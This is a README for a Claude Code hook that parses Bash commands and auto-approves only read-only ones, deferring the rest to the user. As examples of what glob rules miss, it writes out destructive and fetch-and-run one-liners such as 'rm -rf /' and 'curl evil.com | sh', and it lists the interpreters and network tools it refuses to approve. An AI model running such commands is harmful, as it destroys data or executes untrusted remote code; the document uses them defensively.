# Read-Only Bash Hook for Claude Code

A [Claude Code hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that auto-approves Bash commands when they are strictly read-only. Non-read-only commands fall through silently to the normal user prompt — nothing is ever hard-denied.

**Zero-config works.** Install the hook and it immediately approves common read-only commands (`ls`, `cat`, `grep`, `find`, `sort`, `wc`, `jq`, `rg`, `git log`, etc.) while leaving everything else to the interactive prompt.

## Why this exists

Claude Code's [permission system](https://docs.anthropic.com/en/docs/claude-code/security) asks for approval before running Bash commands. You can auto-approve specific patterns with `permissions.allow` rules like `Bash(git status*)` — but the `*` is a simple glob, not a shell-aware parser. `git status*` matches `git status` but it also matches `git status; rm -rf /` and `git status && curl evil.com | sh`. Glob patterns are fundamentally broken as a safety boundary for shell commands.

This leaves you with two choices: approve Bash broadly (and accept the risk of unintended side effects during agentic sessions), or approve nothing (and click through dozens of permission prompts for `ls`, `cat`, `grep`, and `git diff`).

This hook provides a third option: **shell-aware auto-approval**. It uses [bashlex](https://pypi.org/project/bashlex/) to parse commands into a proper AST, walks the tree to extract every executable, and evaluates each one through a deterministic safety pipeline. Pipelines, compound commands, subshells, substitutions, and control flow are all understood structurally — not matched as strings.

The concern that motivated this isn't security against a malicious agent. It's **preventing unintended consequences** during autonomous agentic work. Agents make mistakes. A proper parser catches `ls && rm -rf /` that a glob pattern would let through, while still auto-approving the `ls -la | sort | head -20` pipelines that make up the bulk of agentic Bash usage.

## How it works

```
  Bash command from Claude Code
              |
              v
      bashlex AST parser
              |
              v
      recursive AST walk
              |
              v
  flat list of CommandFragments
              |
              v
  +-----------+------------+
  | 7-step evaluation      |
  | pipeline (per fragment) |
  |                         |
  | 1. output redirect?     |  --> fall through
  | 2. normalize/unwrap     |
  | 3. never-approve list?  |  --> fall through
  | 4. dangerous mode?      |  --> fall through
  | 5. subcommand check     |  --> approve or fall through
  | 6. whitelist check      |  --> approve
  | 7. default              |  --> fall through
  +-------------------------+
              |
       ALL fragments pass?
        /              \
      yes               no
       |                 |
    APPROVE          exit 0, no output
  (JSON to CC)     (CC shows normal prompt)
```

The hook **never denies** — it either auto-approves or silently defers to the human. If bashlex fails to parse a command, if the hook encounters unrecognized shell syntax, if the process crashes — the user just sees a normal permission prompt. Fail-open by design.

### Philosophy

**Never block, only approve or defer.** The hook never uses exit code 2 (hard deny). Every rejection is a silent fall-through. This is the same principle as [agent-tooluse-auditor](https://github.com/aelronatline5/agent-tooluse-auditor): the human is always the final authority, and automation only removes friction for obviously safe operations.

**Default-deny for commands.** Any command not explicitly whitelisted falls through at step 7. The whitelist is opt-in: ~60 commands ship by default, and you can add more via config. But the default answer is always "ask the human."

**Security invariants are code, not config.** The never-approve list (shells, interpreters, `eval`, `sudo`), wrapper command handling, and handler dispatch logic are hardcoded. These aren't user preferences — they're escape hatches that can bypass the entire safety model. You can add commands to the whitelist, but you can't remove `bash` from the never-approve list via a JSON key.

**Convention over configuration.** Zero-config works out of the box. The config surface is intentionally small: add commands, remove commands, toggle feature flags. Everything else is baked in. Users specify only deltas from the defaults.

**Two-stage architecture for extensibility.** Parsing (knows shell syntax, knows nothing about safety) and evaluation (knows about command safety, knows nothing about shell syntax) are deliberately separated by the `CommandFragment` interface. New safety rules are added by extending the pipeline — new steps, new handlers, new feature flags — without touching the parser. New shell syntax support is handled in the parser without touching evaluation logic. This separation exists so that the pipeline can evolve from "strictly read-only" toward "sufficiently safe" over time, via progressive feature flags, without architectural changes.

**Progressive trust via feature flags.** The default is strictly read-only. Feature flags opt into broader categories of safe, local, reversible operations: `gitLocalWrites` approves `git add`, `git branch`, `git stash`; `awkSafeMode` approves awk programs that don't use `system()` or output redirection. Each flag has a clear scope and explicit guards (e.g., `git config --global` is always rejected even with `gitLocalWrites` on). Future flags are planned for network reads, safe file writes, and output redirections.

**Deterministic, zero-cost, context-free.** Unlike LLM-based auditors, this hook makes decisions purely from the command string. No API calls, no token costs, no latency beyond Python startup + bashlex parsing (~50-150ms). No session transcript, no "did the user ask for this?" heuristics. The trade-off is that it can't make context-aware judgments — but for the class of commands it handles (read-only operations), context doesn't matter. `ls -la` is safe regardless of who requested it.

## Requirements

- Python >= 3.10
- [bashlex](https://pypi.org/project/bashlex/) (`pip install bashlex`)

## Installation

### 1. Install the dependency

```bash
pip install bashlex
```

### 2. Copy the hook

Copy the package directory and the entry-point script to your Claude hooks directory:

```bash
mkdir -p ~/.claude/hooks
cp -r readonly_bash_hook/ ~/.claude/hooks/readonly_bash_hook/
cp readonly_bash_hook.py ~/.claude/hooks/readonly_bash_hook.py
```

### 3. Wire into Claude Code settings

Add the hook to your `settings.json` — either project-level (`.claude/settings.json`) or global (`~/.claude/settings.json`).

You have two hook event options — see [Choosing a hook event](#choosing-a-hook-event) below for trade-offs.

#### Option A: `PermissionRequest` (recommended)

```json
{
  "hooks": {
    "PermissionRequest": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/readonly_bash_hook.py"
          }
        ]
      }
    ]
  }
}
```

#### Option B: `PreToolUse`

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 ~/.claude/hooks/readonly_bash_hook.py"
          }
        ]
      }
    ]
  }
}
```

### Choosing a hook event

Claude Code's permission evaluation order is: **PreToolUse hooks → Deny rules → Allow rules → Ask rules → PermissionRequest hooks → canUseTool**.

The hook auto-detects the event from `hook_event_name` in the stdin JSON. Core logic is identical — only the output format differs.

| Aspect | `PermissionRequest` | `PreToolUse` |
|--------|---------------------|--------------|
| **When it fires** | Only when the permission dialog would show | Before *every* Bash tool call |
| **Decision model** | 2-way: `allow` / `deny` | 3-way: `allow` / `deny` / `ask` |
| **On empty output (exit 0)** | Shows the permission dialog | Falls through to the permission system |
| **Overhead** | Low — only invoked for commands not already resolved by declarative rules | Higher — invoked on every call, including already-approved commands |
| **Interaction with `permissions.allow` / `permissions.deny`** | Complementary — declarative rules resolve first, hook handles the rest | Hook runs first — can approve commands before declarative rules even see them |

**Use `PermissionRequest`** (recommended) when:
- You have existing `permissions.allow` / `permissions.deny` rules and want the hook to handle whatever falls through
- You want minimal overhead — the hook only runs when Claude would otherwise ask you
- You want a simple mental model: declarative rules first, hook as a fallback

**Use `PreToolUse`** when:
- You want the hook to be the single source of truth for all Bash approvals
- You want visibility into every command (e.g., for audit logging via `READONLY_HOOK_DEBUG`)
- You don't use declarative permission rules and want all decisions in one place

Do **not** wire to both events simultaneously — it's redundant and the hook would run twice on commands that reach PermissionRequest.

#### Alternative: Run as a Python module

Instead of the wrapper script, you can invoke the package directly:

```json
"command": "python3 -m readonly_bash_hook"
```

This requires `readonly_bash_hook/` to be on `PYTHONPATH` or in the current directory.

## What gets auto-approved

- Simple read-only commands: `ls -la`, `cat file.txt`, `grep pattern file`
- Pipelines of read-only commands: `find . -name "*.py" | head -20 | sort`
- Compound commands: `ls && cat file`, `grep foo bar || echo "not found"`
- Control flow with safe bodies: `for f in *.txt; do cat "$f"; done`
- Command/process substitution: `diff <(sort a) <(sort b)`
- `sed` without `-i`: `sed 's/foo/bar/' file` (read-only transform to stdout)
- `find` without `-exec`/`-delete`: `find . -name "*.py" -type f`
- `find -exec` with safe inner commands: `find . -exec grep foo {} \;`
- `xargs` with safe inner commands: `ls | xargs wc -l`
- Git read-only subcommands: `git log`, `git diff`, `git status`, `git blame`
- Wrapper commands are unwrapped: `env FOO=bar ls`, `nice -n5 cat file`, `command -v git`

## What falls through to user prompt

- Write commands: `rm`, `cp`, `mv`, `mkdir`, `touch`, `chmod`
- Interpreters/shells: `python3`, `bash`, `node`, `perl`, `ruby`
- Shell escape hatches: `eval`, `exec`, `source`, `sudo`
- Output redirections: `ls > file.txt`, `echo foo >> bar`
- `sed -i` (in-place editing)
- `find -delete`, `find -fprint`
- Git write subcommands: `git push`, `git commit`, `git merge`
- `awk` (by default — has `system()` for arbitrary execution; see `awkSafeMode` below)
- Anything not on the whitelist

## Configuration

Configuration lives inside Claude Code's `settings.json` under the `readonlyBashHook` key. If the key is absent, all defaults apply. Only set what you want to change.

```json
{
  "hooks": { "..." : "..." },
  "readonlyBashHook": {
    "extraCommands": ["terraform", "gcloud"],
    "removeCommands": [],
    "features": {
      "gitLocalWrites": false,
      "awkSafeMode": false
    },
    "subcommandWhitelist": {
      "docker": ["ps", "images", "inspect", "logs", "port", "top", "stats", "diff", "history", "info", "version"],
      "kubectl": ["get", "describe", "logs", "top", "api-resources", "api-versions", "cluster-info", "explain", "version"],
      "systemctl": ["status", "list-units", "list-unit-files", "is-active", "is-enabled", "show"]
    }
  }
}
```

Config lives in `settings.json` rather than a separate file so that Claude Code can edit it naturally via user prompting — it's already a file CC knows how to read and write.

### Options

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `extraCommands` | `string[]` | `[]` | Additional commands to auto-approve (e.g., domain-specific read-only tools) |
| `removeCommands` | `string[]` | `[]` | Commands to remove from the default whitelist |
| `features.gitLocalWrites` | `bool` | `false` | Auto-approve local git write subcommands (`add`, `branch`, `tag`, `remote`, `stash`, `config`). `git config --global` and `--system` are still rejected. |
| `features.awkSafeMode` | `bool` | `false` | Instead of rejecting all awk invocations, analyze the awk program and only reject if it contains `system()`, pipes, output redirects, or uses `-f`. |
| `subcommandWhitelist` | `object` | `{}` | Map of executable names to allowed subcommand lists. See [Subcommand whitelisting](#subcommand-whitelisting) below. |

### How config is read

The hook checks two locations at startup, in order:

1. `.claude/settings.json` (project-level)
2. `~/.claude/settings.json` (global)

The first file found wins. The hook extracts the `readonlyBashHook` key and falls back to defaults for any missing field.

### Subcommand whitelisting

Commands like `docker`, `kubectl`, `helm`, and `systemctl` follow the same pattern as `git`: the executable itself is neither safe nor unsafe — it depends on the **subcommand**. Use `subcommandWhitelist` to declare read-only subcommands for any tool without writing code.

```json
{
  "readonlyBashHook": {
    "subcommandWhitelist": {
      "docker": ["ps", "images", "inspect", "logs", "info", "version"],
      "kubectl": ["get", "describe", "logs", "top", "version"]
    }
  }
}
```

**How it works:**

- `docker ps` → subcommand `ps` is in the allowed list → **APPROVE**
- `docker --debug ps` → leading flags are skipped, subcommand `ps` found → **APPROVE**
- `docker rm foo` → subcommand `rm` not in the allowed list → **falls through**
- `docker` (bare, no subcommand) → **falls through**

Git's read-only subcommands (`log`, `diff`, `status`, etc.) are always present as the default entry for `"git"`. User entries for `"git"` are **added** to the defaults, not replacing them. Other executables have no defaults — you declare exactly the subcommands you want.

**Subcommand extraction:** For git, the hook uses specialized flag parsing that understands git's global flags (`-C`, `-c`, `--git-dir`, etc.). For all other commands, a simple heuristic is used: skip leading `-`-prefixed arguments, and take the first non-flag argument as the subcommand.

**Caveat:** The simple heuristic does not handle global flags that consume a positional argument (e.g., `docker -H host ps` would misidentify `host` as the subcommand). If you use tools with such flags, avoid passing them in commands that need auto-approval. A dedicated handler can be added for tools that need precise flag parsing.

**Interaction with other config:** Executables in `subcommandWhitelist` are fully handled by the subcommand check (step 5) — they return APPROVE or fall through, never continue to the general whitelist. They should **not** also be in `extraCommands`.

### Programmatic / test use

```python
from readonly_bash_hook import build_config, evaluate_command, APPROVE

config = build_config(
    extra_commands=["terraform"],
    git_local_writes=True,
    awk_safe_mode=False,
    subcommand_whitelist={
        "docker": ["ps", "images", "inspect"],
        "kubectl": ["get", "describe", "logs"],
    },
)

assert evaluate_command("docker ps", config) is APPROVE
assert evaluate_command("kubectl get pods", config) is APPROVE
```

## Default whitelist

~60 commands are approved out of the box:

| Category | Commands |
|----------|----------|
| Filesystem listing | `ls`, `tree`, `stat`, `file`, `du`, `df` |
| File reading | `cat`, `head`, `tail`, `less`, `more`, `tac` |
| Search | `grep`, `rg`, `fd`, `find`, `locate`, `strings`, `ag` |
| Text processing | `sed`, `cut`, `paste`, `tr`, `sort`, `uniq`, `comm`, `join`, `fmt`, `column`, `nl`, `rev`, `fold`, `expand`, `unexpand`, `wc`, `xargs` |
| JSON / structured data | `jq`, `yq` |
| Diffing | `diff`, `cmp` |
| Path utilities | `readlink`, `realpath`, `basename`, `dirname` |
| Command lookup | `which`, `type`, `whereis` |
| User / system info | `id`, `whoami`, `groups`, `uname`, `hostname`, `uptime`, `printenv` |
| Checksums | `sha256sum`, `sha1sum`, `md5sum`, `cksum`, `b2sum` |
| Binary viewers | `xxd`, `hexdump`, `od` |
| Builtins | `echo`, `printf`, `true`, `false`, `test`, `[`, `read` |
| Process info | `ps`, `top`, `htop`, `lsof`, `pgrep` |

`git` is handled specially via subcommand analysis (not the whitelist).

### Commands intentionally excluded

These aren't on the whitelist and aren't on the never-approve list — they just fall through at step 7:

| Command | Reason |
|---------|--------|
| `tee` | Always writes to files |
| `curl`, `wget` | Network access |
| `cp`, `mv`, `rm`, `mkdir`, `touch`, `chmod`, `chown` | Obvious writes |
| `make`, `pip`, `npm`, `cargo`, `docker` | Side-effecting build/install tools |
| `dd` | Writes via `of=` without shell redirections |
| `ln`, `install`, `patch` | Modifies filesystem |
| `truncate`, `shred` | Destructive |
| `xdg-open`, `open` | Launches external programs |
| `date` | Read-only without `-s`, but `date -s` sets the clock — excluded for simplicity |
| `tar` | List mode is read-only, but extract/create write — excluded for simplicity |

## Architecture

### Two-stage design

1. **Parsing stage** (`parser.py`) — reads the command string, invokes bashlex, walks the AST, and produces a flat list of `CommandFragment` objects. Knows shell syntax, knows nothing about safety.

2. **Evaluation stage** (`pipeline.py`) — runs each `CommandFragment` through the 7-step pipeline. Knows about command safety, knows nothing about shell syntax.

The `CommandFragment` dataclass is the interface between them:

```python
@dataclass
class CommandFragment:
    executable: str            # resolved basename (e.g., "ls", "git")
    args: list[str]            # arguments after the executable
    has_output_redirect: bool  # True if fragment has > or >> redirect
```

### 7-step evaluation pipeline

| Step | Function | Action |
|------|----------|--------|
| 1 | `step1_redirections` | **REJECT** if output redirect detected (`>`, `>>`, `>&file`) |
| 2 | `step2_normalize` | Resolve `basename`, unwrap wrappers (`env`, `nice`, `time`, `command`, `nohup`). **APPROVE** for `command -v/-V`. |
| 3 | `step3_never_approve` | **REJECT** if in never-approve list (shells, interpreters, `eval`, `sudo`, etc.) |
| 4 | *(handlers)* | Dispatch to registered handler (sed, find, xargs, awk). **REJECT** on dangerous mode, **PASS** to continue. |
| 5 | `step5_subcommands` | Subcommand whitelist check (git + user-configured commands). **APPROVE** if subcommand is in allowed set; **REJECT** otherwise. Git uses specialized flag parsing; others use simple flag-skipping heuristic. |
| 6 | `step6_whitelist` | **APPROVE** if executable is in effective whitelist |
| 7 | `step7_default` | **REJECT** (anything not explicitly approved) |

At the orchestrator level, fragment-level `REJECT` becomes `FALLTHROUGH` (silent fall-through), never a hard deny.

### Package structure

```
readonly_bash_hook/
  __init__.py    # Sentinels, CommandFragment, constants, debug logging, re-exports
  config.py      # _Config dataclass, build_config(), settings.json loading
  parser.py      # Pre-parse workarounds, bashlex AST walker, parse_command()
  handlers.py    # Dangerous-mode handlers (sed, find, xargs, awk)
  pipeline.py    # 7-step evaluation pipeline, orchestrator
  output.py      # JSON output formatting, event detection, hook entry processing
  __main__.py    # Hook entry point (python -m readonly_bash_hook)
readonly_bash_hook.py  # Thin wrapper script for direct invocation
```

### Extending with new handlers

To add a new handler (e.g., for a command that is safe in some modes but dangerous in others):

1. **Add the handler function** in `handlers.py`:

```python
def handle_mycommand(args: list[str], config: object = None) -> _Sentinel:
    """Reject mycommand if dangerous flags are detected."""
    for arg in args:
        if arg == "--dangerous-flag":
            return REJECT
    return PASS
```

2. **Register it** in `config.py` inside `build_config()`:

```python
from .handlers import handle_mycommand
handlers["mycommand"] = handle_mycommand
```

3. **Ensure the command is in the whitelist** — add it to `DEFAULT_COMMANDS` in `__init__.py`, or use `extraCommands` in config. The handler runs at step 4 (before the whitelist check at step 6), so a `PASS` from the handler allows the command to proceed to step 6 where it needs to be whitelisted.

Handlers that need recursive evaluation of inner commands (like `handle_find` and `handle_xargs`) can construct a `CommandFragment` and call `pipeline._evaluate_single_fragment()` via lazy import.

## Caveats

- **bashlex limitations**: Some shell constructs may not parse correctly. On parse failure, the hook falls through silently (never blocks). Arithmetic expansion `$((...))` and `[[ ... ]]` test expressions are rewritten before parsing.
- **No process-level isolation**: The hook runs as a Python process invoked by Claude Code. It trusts the shell environment.
- **Variable-as-command**: Commands like `$CMD args` are kept as-is and fall through at step 7 (not in any whitelist). This is by design — dynamic commands can't be statically verified.
- **Function definitions**: `function foo() { rm -rf /; }` — the body is analyzed and dangerous commands are caught. But function *invocations* (`foo`) fall through since they're not whitelisted.
- **awk is blocked by default**: Because awk has `system()` for arbitrary code execution. Enable `awkSafeMode` to allow safe awk programs through.
- **`git push`, `git commit`, etc. always fall through**: Even with `gitLocalWrites` enabled, only local-only write subcommands (`add`, `branch`, `tag`, `remote`, `stash`, `config`) are approved.

## Debug logging

Set the `READONLY_HOOK_DEBUG` environment variable. Logs are written to `~/.claude/hooks/readonly_bash.log`.

| Level | Output |
|-------|--------|
| `1` | Decisions only (approved / fell-through and why) |
| `2` | Fragment extraction details |
| `3` | Full AST dump, config loading, each evaluation step |

Example:

```bash
READONLY_HOOK_DEBUG=1 python3 -m readonly_bash_hook <<< '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls -la"}}'
```

## Development

```bash
# Install dependencies
uv sync

# Run tests
uv run pytest

# Run tests with coverage
uv run pytest --cov=readonly_bash_hook --cov-report=term-missing
```

636 tests, 99% coverage. The test suite was written independently from the briefing spec, and the implementation was built against the spec without reading test internals — the tests serve as black-box validation.

## License

See repository for license information.
